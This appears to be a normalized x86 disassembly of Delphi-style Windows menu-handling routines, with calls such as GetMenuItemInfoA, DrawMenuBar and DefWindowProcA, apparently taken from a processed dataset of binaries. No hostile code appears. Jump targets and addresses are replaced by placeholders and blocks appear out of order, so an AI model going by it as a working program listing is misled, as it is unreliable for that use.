mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_452214
call sub_4535c0
pop ecx
test al al
je r-xdata
sub_453658
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_4535c0
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44fcc4
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_453688
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_453658
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_454a54
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_4536f8
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_453658
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_453714
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_453658
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_452dc4
mov ebx eax
xor edx edx
mov eax edi
call sub_4532c0
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45272c
mov eax [ esi + 0x34 ]
call sub_45272c
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_450668
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_446be4
push eax
call DrawMenuBar
sub_453800
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_453800
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_453925
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_453658
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45272c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4537f0
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_453954
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42a6dc
xor eax eax
push ebp
push sub_453a52
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42a6dc
xor eax eax
push ebp
push sub_453a27
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_453800
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42a6d4
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453a59
mov eax [ rw-data ]
call sub_42a6d4
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_453658
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_453a78
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_453dfc
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_453dfc
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_453b34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4540d0
mov eax ebx
call sub_40891c
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_453bd4
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_453b34
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_40420c
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_40445c
lea edx [ ebp - 0x200 ]
call sub_4089e0
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_453c68
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_453cd8
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_454178
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_454178
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_454178
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_453ce4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_453bd4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_453c68
mov eax ebx
call sub_45419c
jmp r-xdata
sub_453d4c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_453d94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44dfc4
mov eax ebx
call sub_4535a8
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44e008
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41fca8
sub_453dd0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41fef4
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_453d94
sub_453e14
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_453658
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_453658
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_4571a8
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_453e70
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_453f45
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_453658
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_453658
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_452204
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_452214
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404184
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404184
mov eax [ ebp - 0xc ]
pop edx
call sub_408144
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_454d64
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453f4c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fc0
retn
sub_453f58
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_453e14
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_453e70
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_4540d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4537dc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_453658
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_453658
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4089c0
mov eax [ ebp + 0x10 ]
call sub_408904
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45419c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43d2a4
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_454178
mov [ ebx + 0x41 ] 0x1
sub_4541c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_454178
mov [ ebx + 0x41 ] 0x1
sub_454250
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_453d4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_453bd4
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_4542e0
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45431c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
test esi esi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
inc [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0xd ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax edi
call sub_450288
xor eax eax
mov al [ edi + 0x3f ]
cmp eax [ ebx ]
jne r-xdata
sub_454368
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax ebx
call sub_453dfc
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov eax [ ebx + 0x34 ]
mov ecx eax
mov edx [ eax + 0x68 ]
mov eax sub_45431c
call sub_44fcc4
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_4543c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4543ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454410
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454943
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45494a
lea eax [ ebp - 0x30 ]
call sub_403f9c
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov edx [ esi + 0x4 ]
call sub_453714
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_460860
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov dx [ esi + 0x4 ]
call sub_4536f8
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_454776
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_454759
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_423ee8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_423d88
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_454be8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454760
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_423ee8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_453f58
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_453658
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_453658
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_4548b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_454894
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_454877
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_423ee8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_423d88
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45487e
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_423ee8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43d528
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460860
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_453658
